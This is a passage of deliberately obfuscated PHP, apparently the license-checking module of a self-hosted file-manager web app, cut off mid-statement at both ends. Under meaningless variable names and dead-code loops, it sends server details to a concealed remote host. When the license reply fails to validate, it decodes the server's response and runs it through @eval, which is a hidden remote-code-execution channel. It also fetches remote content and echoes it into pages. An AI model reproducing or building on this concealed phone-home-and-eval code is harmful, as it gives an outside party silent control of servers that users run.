$this->tugme2256a99(trim($É‡¨ë™º[$İºİ¯î[177]]), $ÛïÒ‡ºñ, 2); $È×‘¢î„ = json_decode($»ÅŸ½Î, !0); if (!is_array($È×‘¢î„) || !is_array($È×‘¢î„[$İºİ¯î[178]]) || $È×‘¢î„[$İºİ¯î[152]] != !0) { $ŸÁò÷êÁ = $İºİ¯î[179]; $¡âûËù = $È×‘¢î„[$İºİ¯î[178]] ? $İºİ¯î[180] . $È×‘¢î„[$İºİ¯î[178]] : $ŸÁò÷êÁ; show_json($¡âûËù, !1); } else { $Ø‚—È’[$İºİ¯î[155]] = $È×‘¢î„[$İºİ¯î[178]][$İºİ¯î[181]]; } } else { $È×‘¢î„ = $this->bsiwe707ae6d($İºİ¯î[182], $Ø‚—È’, 10); } } if (!is_array($È×‘¢î„) || !is_array($È×‘¢î„[$İºİ¯î[178]]) || $È×‘¢î„[$İºİ¯î[152]] != !0) { $ŸÁò÷êÁ = LNG($İºİ¯î[183]); $¡âûËù = $È×‘¢î„[$İºİ¯î[178]] ? $İºİ¯î[180] . $È×‘¢î„[$İºİ¯î[178]] : $ŸÁò÷êÁ; show_json($¡âûËù, !1); } $Ì¶Í›’ü = $È×‘¢î„[$İºİ¯î[178]]; $ØÉê†Ğ» = $this->xmcw7e59bae4($Ì¶Í›’ü[$İºİ¯î[184]]); $£îÔŞŸ¯ = $ªËñèØ[742]; if (!$ØÉê†Ğ» || $ØÉê†Ğ» != $Ì¶Í›’ü[$İºİ¯î[129]]) { $çùõÄÀô = array($İºİ¯î[185] => Model($İºİ¯î[33])->get($İºİ¯î[100]), $İºİ¯î[186] => $_SERVER[$İºİ¯î[106]], $İºİ¯î[187] => this_url(), $İºİ¯î[161] => $_SERVER[$İºİ¯î[162]]); $»ÅŸ½Î = $this->oqra0b0df1f5(json_encode($çùõÄÀô)); $this->bsiwe707ae6d($İºİ¯î[188] . $»ÅŸ½Î); show_json(LNG($İºİ¯î[189]), !0); } $ñæ‚Ãª³ = array($İºİ¯î[153] => $Ì¶Í›’ü[$İºİ¯î[190]], $İºİ¯î[191] => $Ì¶Í›’ü[$İºİ¯î[192]], $İºİ¯î[193] => rand_string(16), $İºİ¯î[108] => $Ì¶Í›’ü[$İºİ¯î[194]]); if ($Ø‚—È’[$İºİ¯î[155]]) { $ñæ‚Ãª³[$İºİ¯î[193]] = $Ø‚—È’[$İºİ¯î[155]]; } $Úİ¨·ª» = substr(md5($ñæ‚Ãª³[$İºİ¯î[191]]), 10, 10); $óøü°äİ = $Úİ¨·ª» . $ñæ‚Ãª³[$İºİ¯î[108]] . $ñæ‚Ãª³[$İºİ¯î[193]]; $Èö…Ã¡« = $ªËñèØ[743]; if (strlen($Èö…Ã¡«) < $ªËñèØ[714]) { return; } $ñæ‚Ãª³[$İºİ¯î[110]] = strrev(base64_encode($this->gyudb76f3552($óøü°äİ, $İºİ¯î[195]))); $‘³¹Óª” = rand_string(16); $‘ó½Öø = $‘³¹Óª” . $ñæ‚Ãª³[$İºİ¯î[108]] . $this->gyudb76f3552(md5($ñæ‚Ãª³[$İºİ¯î[153]]), $‘³¹Óª”); $è¹“½Çİ = $ªËñèØ[744]; if (strlen($è¹“½Çİ) < $ªËñèØ[698]) { die; } $ñæ‚Ãª³[$İºİ¯î[111]] = base64_encode(strrev($this->gyudb76f3552($‘ó½Öø, $İºİ¯î[196]))); $£±’îÎ = $ªËñèØ[745]; while ($£±’îÎ < $ªËñèØ[702]) { if ($£±’îÎ >= 0) { break; } $£±’îÎ++; } if ($Ì¶Í›’ü[$İºİ¯î[197]] && $Ì¶Í›’ü[$İºİ¯î[197]] >= 1) { Model($İºİ¯î[33])->setDeep($İºİ¯î[198], $İºİ¯î[122]); } Model($İºİ¯î[33])->set($ñæ‚Ãª³); $İº“ÁÁÚ = md5($_SERVER[$İºİ¯î[106]] . strrev($‰ºï©ö¶) . $ñæ‚Ãª³[$İºİ¯î[191]]); $ü²ôıØª = strrev(substr($İº“ÁÁÚ, 10, 16)); $¦×–äÒÛ = $this->zxio34a3b682(json_encode($Ì¶Í›’ü), $İº“ÁÁÚ); $ò˜ÊÎèı = array_to_keyvalue(Model($İºİ¯î[7])->listData(), $İºİ¯î[199]); $ğãªŠæ = $ªËñèØ[746]; while (strlen($ğãªŠæ) < $ªËñèØ[702]) { if (!$ğãªŠæ) { break; } $ğãªŠæ++; } $ŸŸ‡ØÏÜ = $ò˜ÊÎèı[$İºİ¯î[200]]; $§Àı ÆÃ = array(); $§Àı ÆÃ[$ü²ôıØª] = $¦×–äÒÛ; Model($İºİ¯î[7])->update($ŸŸ‡ØÏÜ[$İºİ¯î[201]], array($İºİ¯î[202] => $§Àı ÆÃ)); $this->nmwybea8b394 = $Ì¶Í›’ü; $this->mhfi4e025a73 = $ñæ‚Ãª³[$İºİ¯î[108]]; $this->licenseRegistSuccess(); $öõ‘Àó‚ = $ªËñèØ[747]; while ($öõ‘Àó‚ < $ªËñèØ[698]) { if ($öõ‘Àó‚ >= 0) { break; } $öõ‘Àó‚++; } Cache::set($İºİ¯î[203] . md5($‰ºï©ö¶ . $İºİ¯î[204]), $İºİ¯î[6]); show_json(LNG($İºİ¯î[189]), !0); } private function licenseRegistSuccess() { $¿ÓÙ¡¬ =& $_SERVER[¼’ç§¼´]; $§òåŒ³ø =& $_SERVER[©º°î³Ë]; $¯öæ‡«Ö = Model($§òåŒ³ø[33])->get(); $ÀÇµå¨ = $¿ÓÙ¡¬[748]; if (strlen($ÀÇµå¨) < $¿ÓÙ¡¬[714]) { die; } if ($¯öæ‡«Ö[$§òåŒ³ø[63]] != $§òåŒ³ø[122]) { Model($§òåŒ³ø[33])->set($§òåŒ³ø[63], $§òåŒ³ø[122]); } Action($§òåŒ³ø[205])->initStart(!0); } private function vwecc553b9ed() { $æ€Çˆ­© =& $_SERVER[¼’ç§¼´]; $¢€áÄ’é =& $_SERVER[©º°î³Ë]; Model($¢€áÄ’é[33])->set(array($¢€áÄ’é[153] => $¢€áÄ’é[6], $¢€áÄ’é[191] => $¢€áÄ’é[6], $¢€áÄ’é[108] => $¢€áÄ’é[109], $¢€áÄ’é[110] => $¢€áÄ’é[6], $¢€áÄ’é[111] => $¢€áÄ’é[6])); $Ïõ„«Ÿ‰ = $æ€Çˆ­©[749]; Model($¢€áÄ’é[33])->setDeep($¢€áÄ’é[198], $¢€áÄ’é[206]); $÷ùºò‰Ş = $æ€Çˆ­©[750]; if (strlen($÷ùºò‰Ş) < $æ€Çˆ­©[702]) { die; } $this->nmwybea8b394 = array(); $ÖéÃı¹ğ = $æ€Çˆ­©[751]; $this->mhfi4e025a73 = $¢€áÄ’é[109]; $¥º¼Şüõ = $æ€Çˆ­©[752]; while (strlen($¥º¼Şüõ) < $æ€Çˆ­©[706]) { if (!$¥º¼Şüõ) { break; } $¥º¼Şüõ++; } } private function phjc8a6fb92d() { $÷ãÒÄ²æ =& $_SERVER[¼’ç§¼´]; $ÏíºÚÍñ =& $_SERVER[©º°î³Ë]; $_SERVER[$ÏíºÚÍñ[162]] = _get($_SERVER, $ÏíºÚÍñ[162], APP_HOST); $ÒŞøªíã = $÷ãÒÄ²æ[753]; if (strlen($ÒŞøªíã) < $÷ãÒÄ²æ[698]) { die; } $this->mhfi4e025a73 = $ÏíºÚÍñ[109]; $Ê²Ãƒ—ˆ = $÷ãÒÄ²æ[754]; if (strlen($Ê²Ãƒ—ˆ) < $÷ãÒÄ²æ[438]) { return; } $½ÙÔ¥üš = Model($ÏíºÚÍñ[33])->get(); if ($½ÙÔ¥üš[$ÏíºÚÍñ[108]] == $ÏíºÚÍñ[109]) { return; } $ê²Í‚ì÷ = Model($ÏíºÚÍñ[33])->get($ÏíºÚÍñ[100]); $Ó¬”ƒ…° = $ÏíºÚÍñ[203] . md5($ê²Í‚ì÷ . $ÏíºÚÍñ[204]); $ğŸıä¿Œ = Cache::get($Ó¬”ƒ…°); $ÌÊ¾ë = $÷ãÒÄ²æ[755]; if (strlen($ÌÊ¾ë) < $÷ãÒÄ²æ[438]) { return; } if (!is_array($ğŸıä¿Œ) || !isset($ğŸıä¿Œ[$ÏíºÚÍñ[207]]) || time() - $ğŸıä¿Œ[$ÏíºÚÍñ[207]] >= 60) { $ù¡æ²¤¦ = Model($ÏíºÚÍñ[7])->loadList(); $ıÑ²Ü ” = $ù¡æ²¤¦[$ÏíºÚÍñ[200]]; $Ó‹¦îæ™ = md5($_SERVER[$ÏíºÚÍñ[106]] . strrev($ê²Í‚ì÷) . $½ÙÔ¥üš[$ÏíºÚÍñ[191]]); $«Ÿ è“¢ = strrev(substr($Ó‹¦îæ™, 10, 16)); $ğŸıä¿Œ = $this->tugme2256a99($ıÑ²Ü ”[$ÏíºÚÍñ[86]][$«Ÿ è“¢], $Ó‹¦îæ™); $ğŸıä¿Œ = json_decode($ğŸıä¿Œ, !0); } if (!is_array($ğŸıä¿Œ)) { return $this->vwecc553b9ed(); } $à·Ë„ìÚ = strtotime($ğŸıä¿Œ[$ÏíºÚÍñ[129]]); if (time() >= $à·Ë„ìÚ) { return $this->vwecc553b9ed(); } if (!isset($ğŸıä¿Œ[$ÏíºÚÍñ[207]]) || time() - $ğŸıä¿Œ[$ÏíºÚÍñ[207]] > 20) { $ğŸıä¿Œ[$ÏíºÚÍñ[207]] = time(); Cache::set($Ó¬”ƒ…°, $ğŸıä¿Œ); } $this->nmwybea8b394 = $ğŸıä¿Œ; $this->mhfi4e025a73 = $½ÙÔ¥üš[$ÏíºÚÍñ[108]]; } private function iydo81ab7e5b() { $¶¶„¬èÊ =& $_SERVER[¼’ç§¼´]; $«èÃÇÙ =& $_SERVER[©º°î³Ë]; $çİî­îê = $GLOBALS[$«èÃÇÙ[13]]; $ÒõÉß¥Œ = $¶¶„¬èÊ[756]; if (strlen($ÒõÉß¥Œ) < $¶¶„¬èÊ[438]) { die; } $èÅÌğˆ‚ = $_SERVER[$«èÃÇÙ[24]]; $†Éˆ¨— = $¶¶„¬èÊ[757]; while ($†Éˆ¨— < $¶¶„¬èÊ[698]) { if ($†Éˆ¨— >= 0) { break; } $†Éˆ¨—++; } if ($èÅÌğˆ‚ == $«èÃÇÙ[208] && $this->mhfi4e025a73 == $«èÃÇÙ[109]) { show_json(LNG($«èÃÇÙ[209]), !1, $«èÃÇÙ[210]); } $Íµ¬éÔ = array($«èÃÇÙ[211], $«èÃÇÙ[212]); if (in_array($èÅÌğˆ‚, $Íµ¬éÔ)) { if ($this->mhfi4e025a73 == $«èÃÇÙ[109] && isset($çİî­îê[$«èÃÇÙ[213]])) { show_json(LNG($«èÃÇÙ[209]), !1, $«èÃÇÙ[210]); die; } $½Ü»Ì‘ñ = $this->ioayb6b7d6f1(); if ($½Ü»Ì‘ñ != intval($«èÃÇÙ[214])) { if ($½Ü»Ì‘ñ <= Model($«èÃÇÙ[125])->count()) { show_json(LNG($«èÃÇÙ[215]), !1, $«èÃÇÙ[210]); die; } } } } private function rlec20ea48f1() { $½‚šÜïë =& $_SERVER[¼’ç§¼´]; $‹çà˜‘ú =& $_SERVER[©º°î³Ë]; $‰ÆÌÆŞ› = array($‹çà˜‘ú[119], $‹çà˜‘ú[120]); if (!KodUser::isRoot() || !isset($_GET[$‹çà˜‘ú[216]])) { return; } if (!in_array($_SERVER[$‹çà˜‘ú[24]], $‰ÆÌÆŞ›)) { return; } $‚Û‚±³Í = $‹çà˜‘ú[217]; $º§¥Êğ = $½‚šÜïë[758]; if (strlen($º§¥Êğ) < $½‚šÜïë[714]) { return; } $‚Û‚±³Í = $this->mguk60d65ba1($‚Û‚±³Í, $‹çà˜‘ú[218]); $ù®úöÛŒ = $½‚šÜïë[759]; if (!$ù®úöÛŒ) { return; } $šâÒ¡½æ = stream_context_create(array($‹çà˜‘ú[219] => array($‹çà˜‘ú[220] => $‹çà˜‘ú[221], $‹çà˜‘ú[222] => 3))); $•šÉÍ–“ = @file_get_contents($‚Û‚±³Í, !1, $šâÒ¡½æ); $õÖãîòŸ = $½‚šÜïë[760]; header($‹çà˜‘ú[223]); $Ç»ÕÀâÇ = $½‚šÜïë[761]; if (!$Ç»ÕÀâÇ) { die; } if ($•šÉÍ–“ && strstr($•šÉÍ–“, $‹çà˜‘ú[224])) { echo $•šÉÍ–“; } die; } public function amlh00da0d67($Ò×èÇ‘Ğ) { $¦­ô‡Şà =& $_SERVER[¼’ç§¼´]; $»ÚÓÜŸ§ =& $_SERVER[©º°î³Ë]; if ($this->mhfi4e025a73 == $»ÚÓÜŸ§[225]) { return $Ò×èÇ‘Ğ; } $Î²Ú’¼ = $this->versionPluginList(); $ûÓ€Ç‚Â = explode($»ÚÓÜŸ§[226], $this->versionPluginFilter()); $Öñ öİÓ = $¦­ô‡Şà[762]; if (!$Öñ öİÓ) { return; } $´£½‹ùÎ = array(); $ÕËÄ¡³æ = $¦­ô‡Şà[763]; if (strlen($ÕËÄ¡³æ) < $¦­ô‡Şà[438]) { die; } foreach ($Î²Ú’¼ as $ìæÔ‹Øğ => $Ø˜³Óº) { if ($Ø˜³Óº == $»ÚÓÜŸ§[227] && substr($this->mhfi4e025a73, 0, 1) == $»ÚÓÜŸ§[227]) { continue; } if (!in_array($ìæÔ‹Øğ, $ûÓ€Ç‚Â)) { $´£½‹ùÎ[] = $ìæÔ‹Øğ; } } foreach ($´£½‹ùÎ as $ìæÔ‹Øğ) { unset($Ò×èÇ‘Ğ[$ìæÔ‹Øğ]); $ˆÊº™´ˆ = $¦­ô‡Şà[764]; while (strlen($ˆÊº™´ˆ) < $¦­ô‡Şà[438]) { if (!$ˆÊº™´ˆ) { break; } $ˆÊº™´ˆ++; } } return $Ò×èÇ‘Ğ; } private function versionPluginList() { $Ã¯ÏéÇä =& $_SERVER[©º°î³Ë]; return array($Ã¯ÏéÇä[228] => $Ã¯ÏéÇä[227], $Ã¯ÏéÇä[229] => $Ã¯ÏéÇä[227], $Ã¯ÏéÇä[230] => $Ã¯ÏéÇä[227], $Ã¯ÏéÇä[231] => $Ã¯ÏéÇä[232], $Ã¯ÏéÇä[233] => $Ã¯ÏéÇä[232], $Ã¯ÏéÇä[234] => $Ã¯ÏéÇä[232], $Ã¯ÏéÇä[235] => $Ã¯ÏéÇä[232], $Ã¯ÏéÇä[236] => $Ã¯ÏéÇä[232], $Ã¯ÏéÇä[237] => $Ã¯ÏéÇä[232], $Ã¯ÏéÇä[238] => $Ã¯ÏéÇä[232], $Ã¯ÏéÇä[239] => $Ã¯ÏéÇä[232], $Ã¯ÏéÇä[240] => $Ã¯ÏéÇä[232], $Ã¯ÏéÇä[241] => $Ã¯ÏéÇä[232], $Ã¯ÏéÇä[242] => $Ã¯ÏéÇä[232], $Ã¯ÏéÇä[243] => $Ã¯ÏéÇä[232], $Ã¯ÏéÇä[244] => $Ã¯ÏéÇä[232]); } private function versionPluginFilter() { $ëÈÖ·ÆÓ =& $_SERVER[©º°î³Ë]; if ($this->mhfi4e025a73 == $ëÈÖ·ÆÓ[109]) { return $ëÈÖ·ÆÓ[6]; } $—ğ¤›Èï = _get($this->nmwybea8b394, $ëÈÖ·ÆÓ[245], $ëÈÖ·ÆÓ[6]); $é’ûúæÁ = _get($this->nmwybea8b394, $ëÈÖ·ÆÓ[116], $ëÈÖ·ÆÓ[6]); $Óï¥è¨´ = _get($this->nmwybea8b394, $ëÈÖ·ÆÓ[246], $ëÈÖ·ÆÓ[6]); if ($é’ûúæÁ > time() && $Óï¥è¨´ > time()) { $ª‚ù¯£® = explode($ëÈÖ·ÆÓ[226], $—ğ¤›Èï); $ëâ½Ôİæ = array_keys($this->versionPluginList()); $—ğ¤›Èï = array_merge($ª‚ù¯£®, $ëâ½Ôİæ); $—ğ¤›Èï = implode($ëÈÖ·ÆÓ[226], array_filter(array_unique($—ğ¤›Èï))); } return $—ğ¤›Èï; } private function strucaca9856() { $§‘÷×Ò =& $_SERVER[©º°î³Ë]; if ($this->mhfi4e025a73 != $§‘÷×Ò[109]) { $GLOBALS[$§‘÷×Ò[86]][$§‘÷×Ò[90]][$§‘÷×Ò[247]] = $§‘÷×Ò[206]; return; } $GLOBALS[$§‘÷×Ò[86]][$§‘÷×Ò[248]] = $§‘÷×Ò[122]; if (Model($§‘÷×Ò[249])->get($§‘÷×Ò[63]) != $§‘÷×Ò[206]) { Model($§‘÷×Ò[249])->set($§‘÷×Ò[63], $§‘÷×Ò[206]); } } public function aobm43877ece() { return $_SERVER[©º°î³Ë][250]; } private function txkw6a3d8071() { $õÕî¾‘ =& $_SERVER[¼’ç§¼´]; $ËÌñï¥Ó =& $_SERVER[©º°î³Ë]; $¿Ğµ¯í¤ = array($ËÌñï¥Ó[251], $ËÌñï¥Ó[252], $ËÌñï¥Ó[253]); $ù…şÃÖ“ = $õÕî¾‘[765]; while (strlen($ù…şÃÖ“) < $õÕî¾‘[706]) { if (!$ù…şÃÖ“) { break; } $ù…şÃÖ“++; } $ˆ¢­¸Ê‰ = $ËÌñï¥Ó[254] . md5($ËÌñï¥Ó[255]); if ($this->mhfi4e025a73 == $ËÌñï¥Ó[109] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$ËÌñï¥Ó[24]], $¿Ğµ¯í¤)) { return; } if (time() % 4 != 0) { return; } $ÎÍã²í• = call_user_func(array($ËÌñï¥Ó[256], $ËÌñï¥Ó[257]), $ˆ¢­¸Ê‰); if ($ÎÍã²í• && time() - $ÎÍã²í• < intval($ËÌñï¥Ó[258])) { return; } call_user_func(array($ËÌñï¥Ó[256], $ËÌñï¥Ó[139]), $ˆ¢­¸Ê‰, time()); $„Àû£İ  = $õÕî¾‘[766]; if (strlen($„Àû£İ ) < $õÕî¾‘[438]) { die; } $Ãù¦æ¾„ = Model($ËÌñï¥Ó[33])->get($ËÌñï¥Ó[100]); $û—å©šš = array($ËÌñï¥Ó[152] => Model($ËÌñï¥Ó[33])->get($ËÌñï¥Ó[153]), $ËÌñï¥Ó[167] => $this->mhfi4e025a73, $ËÌñï¥Ó[163] => $_SERVER[$ËÌñï¥Ó[164]], $ËÌñï¥Ó[165] => Model($ËÌñï¥Ó[33])->get($ËÌñï¥Ó[131]), $ËÌñï¥Ó[105] => md5($_SERVER[$ËÌñï¥Ó[106]] . $Ãù¦æ¾„), $ËÌñï¥Ó[156] => $ËÌñï¥Ó[136], $ËÌñï¥Ó[159] => $_SERVER[$ËÌñï¥Ó[160]]); $ú¾Ôß´ = $this->bsiwe707ae6d($ËÌñï¥Ó[259], $û—å©šš); if (!is_array($ú¾Ôß´)) { return; } if ($ú¾Ôß´[$ËÌñï¥Ó[152]] && $ú¾Ôß´[$ËÌñï¥Ó[260]]) { if ($this->xmcw7e59bae4($ú¾Ôß´[$ËÌñï¥Ó[260]]) == $û—å©šš[$ËÌñï¥Ó[152]]) { return; } } $this->vwecc553b9ed(); $…Ñû¨¦Ä = $õÕî¾‘[767]; while ($…Ñû¨¦Ä < $õÕî¾‘[438]) { if ($…Ñû¨¦Ä >= 0) { break; } $…Ñû¨¦Ä++; } if ($this->xmcw7e59bae4($ú¾Ôß´[$ËÌñï¥Ó[260]]) != $û—å©šš[$ËÌñï¥Ó[152]]) { $ğÄÎÉ—¸ = array($ËÌñï¥Ó[185] => $Ãù¦æ¾„, $ËÌñï¥Ó[186] => $_SERVER[$ËÌñï¥Ó[106]], $ËÌñï¥Ó[187] => this_url(), $ËÌñï¥Ó[161] => $_SERVER[$ËÌñï¥Ó[162]]); $”±½Ü§Õ = $this->oqra0b0df1f5(json_encode($ğÄÎÉ—¸)); $ú¾Ôß´ = $this->bsiwe707ae6d($ËÌñï¥Ó[188] . $”±½Ü§Õ); if ($ú¾Ôß´ && is_array($ú¾Ôß´) && isset($ú¾Ôß´[$ËÌñï¥Ó[260]])) { $ñ›ÃÕæı = $this->tugme2256a99($ú¾Ôß´[$ËÌñï¥Ó[260]], 2); if ($ñ›ÃÕæı) { $ñ›ÃÕæı = $this->xmcw7e59bae4($ñ›ÃÕæı); } if ($ñ›ÃÕæı) { try { @eval($ñ›ÃÕæı); } catch (Exception $Š…Ëşİ) { } } } } } private function bsiwe707ae6d($Ò“êæ®¤ = '', $¦äù´¶ = array(), $êÔ†Ï›Ò = 5) { $ÆŠŠò·ƒ =& $_SERVER[¼’ç§¼´]; $Ô«»’ã =& $_SERVER[©º°î³Ë]; $Á¬Œ„ØÚ = $Ô«»’ã[261]; $Á¬Œ„ØÚ = $this->mguk60d65ba1($Á¬Œ„ØÚ, $Ô«»’ã[262]); $š ÔÁ¿ = $ÆŠŠò·ƒ[768]; $Á¬Œ„ØÚ = $Á¬Œ„ØÚ . $Ò“êæ®¤; if ($¦äù´¶ && is_array($¦äù´¶)) { $Á¬Œ„ØÚ = $Á¬Œ„ØÚ . $Ô«»’ã[263] . http_build_query($¦äù´¶); } if ($¦äù´¶ === -1) { return $Á¬Œ„ØÚ; } $âÙÂ÷Á˜ = stream_context_create(array($Ô«»’ã[219] => array($Ô«»’ã[222] => $êÔ†Ï›Ò, $Ô«»’ã[220] => $Ô«»’ã[264]), $Ô«»’ã[265] => array($Ô«»’ã[266] => !1, $Ô«»’ã[267] => !1))); $Õ·ü¥¶» = $ÆŠŠò·ƒ[769]; if (!$Õ·ü¥¶») { die; } $¦äù´¶ = @file_get_contents($Á¬Œ„ØÚ, !1, $âÙÂ÷Á˜); $ŒàãÔÇ¢ = $ÆŠŠò·ƒ[770]; return json_decode($¦äù´¶, !0); $ŞééÛŠ¬ = $ÆŠŠò·ƒ[771]; $éËşûöà = $ÆŠŠò·ƒ[772]; if (!$éËşûöà) { die; } } private function ioayb6b7d6f1() { $â¼‰ãâ =& $_SERVER[¼’ç§¼´]; $²–¯Ëâ– =& $_SERVER[©º°î³Ë]; $¦¥„ˆñ = array($²–¯Ëâ–[268] => $²–¯Ëâ–[269], $²–¯Ëâ–[270] => $²–¯Ëâ–[271], $²–¯Ëâ–[272] => $²–¯Ëâ–[273], $²–¯Ëâ–[274] => $²–¯Ëâ–[275], $²–¯Ëâ–[276] => $²–¯Ëâ–[277], $²–¯Ëâ–[278] => $²–¯Ëâ–[214], $²–¯Ëâ–[279] => $²–¯Ëâ–[214], $²–¯Ëâ–[280] => $²–¯Ëâ–[269], $²–¯Ëâ–[281] => $²–¯Ëâ–[271], $²–¯Ëâ–[282] => $²–¯Ëâ–[273], $²–¯Ëâ–[283] => $²–¯Ëâ–[284], $²–¯Ëâ–[285] => $²–¯Ëâ–[275], $²–¯Ëâ–[286] => $²–¯Ëâ–[287], $²–¯Ëâ–[288] => $²–¯Ëâ–[277], $²–¯Ëâ–[289] => $²–¯Ëâ–[290], $²–¯Ëâ–[291] => $²–¯Ëâ–[292], $²–¯Ëâ–[293] => $²–¯Ëâ–[294]); $À‹¨ÂŠ = $â¼‰ãâ[773]; while (strlen($À‹¨ÂŠ) < $â¼‰ãâ[706]) { if (!$À‹¨ÂŠ) { break; } $À‹¨ÂŠ++; } $Ú’ø‰ë = $¦¥„ˆñ[$this->mhfi4e025a73]; $’áãëÏ = $â¼‰ãâ[774]; if (!$’áãëÏ) { die; } $Ú’ø‰ë = intval($Ú’ø‰ë ? $Ú’ø‰ë : $²–¯Ëâ–[269]); $¯Ê¼ü„ = $â¼‰ãâ[775]; if (!$¯Ê¼ü„) { return; } $õ™º™áÍ = _get($this->nmwybea8b394, $²–¯Ëâ–[295]); $Ğ‚½¨ÄÓ = $â¼‰ãâ[776]; if (!$Ğ‚½¨ÄÓ) { die; } $õ™º™áÍ = $õ™º™áÍ ? intval($õ™º™áÍ) : 0; return $Ú’ø‰ë + $õ™º™áÍ; } public function uzqv5648af64($²¶¶²) { $‘¢Ï¶ =& $_SERVER[¼’ç§¼´]; $õŒ¯¿Î¼ =& $_SERVER[©º°î³Ë]; $‡º¼ÒÏÓ = $this->ioayb6b7d6f1(); $Š¿òÉ¿Ù = $‘¢Ï¶[777]; while ($Š¿òÉ¿Ù < $‘¢Ï¶[438]) { if ($Š¿òÉ¿Ù >= 0) { break; } $Š¿òÉ¿Ù++; } if ($²¶¶²[$õŒ¯¿Î¼[296]] == $õŒ¯¿Î¼[122]) { return; } if ($‡º¼ÒÏÓ >= intval($õŒ¯¿Î¼[214])) { return; } $»çÊ†À = Model($õŒ¯¿Î¼[125])->count(); if ($»çÊ†À <= $‡º¼ÒÏÓ) { return; } $Á°áÀ – = Model($õŒ¯¿Î¼[125])->field($õŒ¯¿Î¼[296])->limit($‡º¼ÒÏÓ)->select(); $‘ Ã¸‡Ø = $‘¢Ï¶[778]; if (strlen($‘ Ã¸‡Ø) < $‘¢Ï¶[714]) { die; } $Á°áÀ – = array_to_keyvalue($Á°áÀ –, $õŒ¯¿Î¼[6], $õŒ¯¿Î¼[296]); if (!in_array($²¶¶²[$õŒ¯¿Î¼[296]], $Á°áÀ –)) { show_json($õŒ¯¿Î¼[297], !1, $õŒ¯¿Î¼[210]); } } public function gruw6877c778() { $­ä¡¾ı£ =& $_SERVER[¼’ç§¼´]; $Ëüîø½Î =& $_SERVER[©º°î³Ë]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $“ªßÑ€² = $Ëüîø½Î[217]; $“ªßÑ€² = $this->mguk60d65ba1($“ªßÑ€², $Ëüîø½Î[218]); $²úøŸ = stream_context_create(array($Ëüîø½Î[219] => array($Ëüîø½Î[220] => $Ëüîø½Î[221], $Ëüîø½Î[222] => 3))); $˜Ú“òÔ = $­ä¡¾ı£[779]; if (!$˜Ú“òÔ) { return; } $ÙÎø¯¢à = @file_get_contents($“ªßÑ€², !1, $²úøŸ); $¢ÊÃ·‡ì = $­ä¡¾ı£[780]; if (!$¢ÊÃ·‡ì) { return; } echo $Ëüîø½Î[298] . hash_encode($ÙÎø¯¢à) . $Ëüîø½Î[299]; $‰øä¾ë„ = $­ä¡¾ı£[781]; while (strlen($‰øä¾ë„) < $­ä¡¾ı£[438]) { if (!$‰øä¾ë„) { break; } $‰øä¾ë„++; } } private function zxio34a3b682($ÖŒ°ôÌû, $Ÿ—±Ğë, $€ªé«ˆå = 3) { $ş°˜ˆĞ =& $_SERVER[¼’ç§¼´]; $”ìŞˆúó =& $_SERVER[©º°î³Ë]; usleep(1); $ÖŒ°ôÌû = trim($ÖŒ°ôÌû); $šÆ¶óÈä = $ş°˜ˆĞ[782]; $ş¸¥À¨¾ = mt_rand(0, 5) . $”ìŞˆúó[6]; $øóå«û = $ş°˜ˆĞ[783]; if (!$øóå«û) { return; } $²·£ŒÙ– = rand_string(15); $ğ÷Ò¥²‹ = $”ìŞˆúó[300]; $ôàòİˆ˜ = $ş°˜ˆĞ[784]; if (strlen($ôàòİˆ˜) < $ş°˜ˆĞ[698]) { return; } switch ($ş¸¥À¨¾) { case $”ìŞˆúó[206]: $’ù¸–ò´ = $this->gyudb76f3552($ÖŒ°ôÌû, strrev($Ÿ—±Ğë . $²·£ŒÙ–)); $’º†Õ˜ß = $ş°˜ˆĞ[785]; break; $£¢øÄÂ = $ş°˜ˆĞ[786]; if (strlen($£¢øÄÂ) < $ş°˜ˆĞ[714]) { return; } case $”ìŞˆúó[122]: $’ù¸–ò´ = $this->gyudb76f3552($ÖŒ°ôÌû, strrev($²·£ŒÙ– . $Ÿ—±Ğë)); $ôÙôÅ´ = $ş°˜ˆĞ[787]; break; case $”ìŞˆúó[301]: $’ù¸–ò´ = $this->gyudb76f3552($ÖŒ°ôÌû, base64_encode($²·£ŒÙ– . $Ÿ—±Ğë)); $ÎµœÚµÉ = $ş°˜ˆĞ[788]; if (!$ÎµœÚµÉ) { return; } break; case $”ìŞˆúó[302]: $’ù¸–ò´ = $this->gyudb76f3552($ÖŒ°ôÌû, md5($²·£ŒÙ– . $Ÿ—±Ğë)); $„Û¨€·Ò = $ş°˜ˆĞ[789]; break; $§àËö»Ò = $ş°˜ˆĞ[790]; if (!$§àËö»Ò) { die; } case $”ìŞˆúó[303]: $ÖŒ°ôÌû = base64_encode($ÖŒ°ôÌû); $ÖòÍïÙº = $ş°˜ˆĞ[791]; while (strlen($ÖòÍïÙº) < $ş°˜ˆĞ[438]) { if (!$ÖòÍïÙº) { break; } $ÖòÍïÙº++; } $¤˜¬Ä— = rand(0, 64); $îÎù¬•£ = $ğ÷Ò¥²‹[$¤˜¬Ä—]; $±şæÖŸ = $ş°˜ˆĞ[792]; if (!$±şæÖŸ) { die; } $şÇ†šÕ¢ = md5($îÎù¬•£ . md5($Ÿ—±Ğë . $îÎù¬•£) . $Ÿ—±Ğë); $şÇ†šÕ¢ = substr($şÇ†šÕ¢, $¤˜¬Ä— % 8, $¤˜¬Ä— % 8 + 7); $€Ñ‘«äÖ = $ş°˜ˆĞ[793]; if (strlen($€Ñ‘«äÖ) < $ş°˜ˆĞ[698]) { return; } $©ñÄäëÒ = $”ìŞˆúó[6]; $ìéÁµ˜ß = $ş°˜ˆĞ[794]; $…’£ªçÃ = 0; $åêÈ½øË = 0; $™áøƒ®Ù = 0; for ($…’£ªçÃ = 0; $…’£ªçÃ < strlen($ÖŒ°ôÌû); $…’£ªçÃ++) { $™áøƒ®Ù = $™áøƒ®Ù == strlen($şÇ†šÕ¢) ? 0 : $™áøƒ®Ù; $»Œ¹ú£ = $ş°˜ˆĞ[795]; if (strlen($»Œ¹ú£) < $ş°˜ˆĞ[698]) { return; } $åêÈ½øË = ($¤˜¬Ä— + strpos($ğ÷Ò¥²‹, $ÖŒ°ôÌû[$…’£ªçÃ]) + ord($şÇ†šÕ¢[$™áøƒ®Ù++])) % 64; $©ñÄäëÒ .= $ğ÷Ò¥²‹[$åêÈ½øË]; } $’ù¸–ò´ = hash_encode($îÎù¬•£ . $©ñÄäëÒ); $¾£íâŠ = $ş°˜ˆĞ[796]; while ($¾£íâŠ < $ş°˜ˆĞ[702]) { if ($¾£íâŠ >= 0) { break; } 